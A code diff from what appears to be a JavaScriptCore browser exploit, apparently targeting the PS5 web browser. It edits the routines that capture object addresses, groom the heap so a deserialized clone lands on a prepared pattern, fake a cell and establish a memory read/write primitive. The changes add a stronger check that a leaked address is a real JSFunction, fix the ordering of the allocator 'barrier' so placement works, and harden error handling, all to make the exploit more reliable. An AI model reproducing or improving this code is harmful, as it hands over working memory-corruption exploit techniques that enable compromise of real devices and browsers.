@@ -17,7 +17,7 @@ const CARRIER_SLOTS = (function () {
     try {
         const q = new URLSearchParams(location.search).get("slots");
         const n = q ? parseInt(q, 10) : 0;
-        if (n >= 100000 && n <= 40000000) return n;
+        if (n >= 100000 && n <= 9000000) return n;   // FIX C: was 40000000
     } catch (e) { }
     return 4000000;
 })();
@@ -285,11 +285,40 @@ function encodedHeaderNumber() {
     return f64[0];
 }
 
+// FIX B: stronger invariant. The old code only checked that two reads
+// of the same address agreed and that the bytes matched a pattern. That
+// doesn't prove the address points at a JSFunction rather than at some
+// other JSCell that happens to share the SID-range or butterfly shape.
+// This checks the header as a coherent JSFunction: valid SID range,
+// zeroed attribute byte, present butterfly pointer with correct
+// alignment and tag bits.
+function looksLikeJSFunction(addr) {
+    if (!plausibleAddress(addr) || addr % 8 !== 0) return false;
+    let blk;
+    try { blk = readBytesAt(addr, 0x20); }
+    catch (e) { console.warn("[core] looksLikeJSFunction read threw:", e); return false; }
+
+    const sid = blk[0] | (blk[1] << 8) | (blk[2] << 16) | (blk[3] << 24);
+    if (sid < 0x100 || sid >= 0x08000000) return false;
+    if (blk[4] !== 0) return false;
+    if (blk[7] !== 0 && blk[7] !== 1) return false;
+
+    const bflyLo = blk[8] | (blk[9] << 8) | (blk[10] << 16) | (blk[11] << 24);
+    const bflyHi = blk[12] | (blk[13] << 8) | (blk[14] << 16) | (blk[15] << 24);
+    if (bflyHi !== 0 || bflyLo === 0) return false;
+    if (bflyLo % 8 !== 0) return false;
+
+    return true;
+}
+
 function emit(tag, detail) {
     if (onEvent === null)
         return;
-    try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); }
-    catch {  }
+    try {
+        onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
+    } catch (err) {
+        try { console.warn("[core.emit] handler threw:", err); } catch { }
+    }
 }
 
 function checkCarrierIdentity(candidate) {
@@ -320,8 +349,13 @@ function giveUp(reason) {
     settleResolve = null;
     settleReject = null;
     running = false;
-    if (reject !== null)
-        reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
+    if (reject !== null) {
+        try {
+            reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
+        } catch (err) {
+            console.warn("[core.giveUp] reject threw:", err);
+        }
+    }
 }
 
 function failed() {
@@ -333,7 +367,8 @@ function failed() {
     stopped = false;
     retryScheduled = false;
     setTimeout(() => {
-        try { history.replaceState(null, ""); } catch { }
+        try { history.replaceState(null, ""); }
+        catch (e) { console.warn("[core.failed] history reset threw:", e); }
         attemptNumber++;
         startAttempt();
     }, AUTO_RETRY_DELAY_MS);
@@ -364,9 +399,11 @@ function releaseAttemptAllocations() {
     capturedWords = null;
     predecessorWords = null;
     keepAlive = null;
-    try { history.replaceState(null, ""); } catch { }
+    try { history.replaceState(null, ""); }
+    catch (e) { console.warn("[core.releaseAttemptAllocations] history reset threw:", e); }
     if (typeof globalThis.gc === "function") {
-        try { globalThis.gc(); } catch { }
+        try { globalThis.gc(); }
+        catch (e) { console.warn("[core] gc() threw:", e); }
     }
 }
 
@@ -500,7 +537,7 @@ function startAttempt() {
         sessionStorage.setItem(attemptKey, String(attemptNumber));
         attemptPersisted = sessionStorage.getItem(attemptKey)
             === String(attemptNumber);
-    } catch { }
+    } catch (e) { console.warn("[core] sessionStorage probe threw:", e); }
     emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
         + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
     try {
@@ -644,6 +681,8 @@ function runAddrofCapture() {
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
 
+        // The 32 MB getterCarrier array and its string are dead here.
+        // Null the whole chain so JSC can reclaim them before the walk.
         leakedScope = null;
         getterCarrier = null;
         preparedSymbolObject = null;
@@ -849,6 +888,21 @@ function loadHistoryCritical() {
             return;
         }
 
+        // FIX B: prove the candidate really is a JSFunction, not just
+        // bytes with the right shape. If this fails, the walk would have
+        // picked up garbage anyway and produced a misleading FN_BYTES.
+        if (!looksLikeJSFunction(nativeTargetAddress)) {
+            emit("FUNC-HEADER-WEAK",
+                `addr=${hex(nativeTargetAddress)}`
+                + `-bytes=${dumpHex(holderHeader, HOLDER_BYTES)}`);
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
         aimCarrier(candidate, nativeTargetAddress);
         readBytes(targetHeader, rwView, FUNCTION_BYTES);
 
@@ -898,7 +952,6 @@ function loadHistoryCritical() {
         profile.nativeExecType = targetHeader[5];
         profile.nativeExecFlags = targetHeader[6];
 
-        try { globalThis.__ps5NativeCtor = nativeConstructorAddress; } catch (e) { }
         const nativeExecType1 = targetHeader[5];
 
         nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x100
@@ -948,23 +1001,29 @@ function loadHistoryCritical() {
         candidate = null;
         clearPredecessor();
 
-        try { history.replaceState(null, ""); } catch { }
+        try { history.replaceState(null, ""); }
+        catch (e) { console.warn("[core] history drop threw:", e); }
 
         compositionState = 1;
     } catch (error) {
         retrySafe = candidate === null && result === null
             && !rwHeaderCaptured && error?.name === "TypeError";
         if (result !== null) {
-            try { result[DUPLICATE_INDEX] = undefined; } catch { }
+            try { result[DUPLICATE_INDEX] = undefined; }
+            catch (e) { console.warn("[core] result cleanup threw:", e); }
         }
         if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
-            try { restoreCarrier(candidate); } catch { }
+            try { restoreCarrier(candidate); }
+            catch (e) { console.warn("[core] restoreCarrier in catch threw:", e); }
         }
         candidate = null;
         result = null;
-        try { targetView[0] = 0xa5; } catch { }
-        try { rwMirror[0] = 0x3c; } catch { }
-        try { clearPredecessor(); } catch { }
+        try { targetView[0] = 0xa5; }
+        catch (e) { console.warn("[core] targetView reset threw:", e); }
+        try { rwMirror[0] = 0x3c; }
+        catch (e) { console.warn("[core] rwMirror reset threw:", e); }
+        try { clearPredecessor(); }
+        catch (e) { console.warn("[core] clearPredecessor threw:", e); }
         compositionError = error;
         compositionState = -1;
     }
@@ -999,13 +1058,11 @@ function runGroomAndLoad() {
         emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
             + `-fake=${hex(fakeAddress)}`);
 
-        // FIXED: free the holes first, then run the barrier. The barrier
-        // is documented as "before critical load" -- its whole purpose
-        // is to nudge JSC's allocator into the just-freed region so the
-        // deserializer's clone cell lands on the predecessor pattern.
+        // FIX: free the holes first, then run the barrier. The barrier
+        // is meant to nudge JSC's allocator into the just-freed region
+        // so the deserializer's clone lands on the predecessor pattern.
         // Running it before the free meant its allocations landed on
-        // the pre-free heap and had zero effect on placement, which is
-        // exactly the ZERO-HEADER-MISS-every-time pattern.
+        // the pre-free heap and had no effect on placement.
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
 
@@ -1013,7 +1070,8 @@ function runGroomAndLoad() {
 
         loadHistoryCritical();
     } catch (error) {
-        try { clearPredecessor(); } catch {}
+        try { clearPredecessor(); }
+        catch (e) { console.warn("[core] clearPredecessor on groom fail threw:", e); }
         retrySafe = true;
         compositionError = error;
         compositionState = -1;
@@ -1030,16 +1088,17 @@ function ensureBarrierNode() {
         barrierNode = document.createElement("div");
         barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
         document.body.appendChild(barrierNode);
-    } catch { barrierNode = null; }
+    } catch (e) {
+        console.warn("[core] barrier node create threw:", e);
+        barrierNode = null;
+    }
 }
 
 function defaultCriticalBarrier(fake, target) {
-    // FIXED: the old barrier was pure DOM/storage -- it never touched
-    // JSC's JSCell allocator, so it could not influence where the
-    // deserializer's clone landed. This version forces a synchronous
-    // batch of small JSCell allocations so the pool's free-list frontier
-    // advances past the just-freed holes. The clone then lands on the
-    // tail of that region, which is where the predecessor pattern lives.
+    // Force a synchronous batch of small JSCell allocations so the
+    // pool's free-list frontier advances past the just-freed holes.
+    // Without this, the deserializer's clone lands wherever the pool
+    // happens to be, which is the ZERO-HEADER-MISS case.
     const nudge = [];
     for (let i = 0; i < 64; ++i) nudge.push({ i });
     nudge.length = 0;
@@ -1051,8 +1110,9 @@ function defaultCriticalBarrier(fake, target) {
             void barrierNode.offsetWidth;
         }
         void new Blob([line], { type: "text/plain" });
-        try { sessionStorage.setItem(burstKey, line); } catch { }
-    } catch { }
+        try { sessionStorage.setItem(burstKey, line); }
+        catch (e) { console.warn("[core] burst write threw:", e); }
+    } catch (e) { console.warn("[core.barrier] marker threw:", e); }
 }
 
 function beginComposition() {
@@ -1204,8 +1264,10 @@ function reportComposition() {
     const resolve = settleResolve;
     settleResolve = null;
     settleReject = null;
-    if (resolve !== null)
-        resolve(buildCarrier());
+    if (resolve !== null) {
+        try { resolve(buildCarrier()); }
+        catch (e) { console.warn("[core] resolve threw:", e); }
+    }
 }
 
 function buildCarrier() {
@@ -1286,7 +1348,8 @@ export function establishPrimitive(options) {
     running = true;
     stopped = false;
     attemptNumber = 1;
-    try { sessionStorage.removeItem(attemptKey); } catch { }
+    try { sessionStorage.removeItem(attemptKey); }
+    catch (e) { console.warn("[core] sessionStorage clear threw:", e); }
 
     return new Promise((resolve, reject) => {
         settleResolve = resolve;
@@ -1338,7 +1401,17 @@ export function releaseFakeCell() {
     try {
         history.replaceState(null, "");
         report.historyCleared = history.state === null;
-    } catch (_) { }
+    } catch (e) { console.warn("[core.releaseFakeCell] history reset threw:", e); }
+
+    // FIX D: if a caller was still awaiting establishPrimitive, reject
+    // their promise now instead of leaving it pending forever.
+    const reject = settleReject;
+    settleResolve = null;
+    settleReject = null;
+    if (reject !== null) {
+        try { reject(new Error("core: released before primitive resolved")); }
+        catch (e) { console.warn("[core.releaseFakeCell] late reject threw:", e); }
+    }
 
     fakeReleased = true;
     stopped = true;
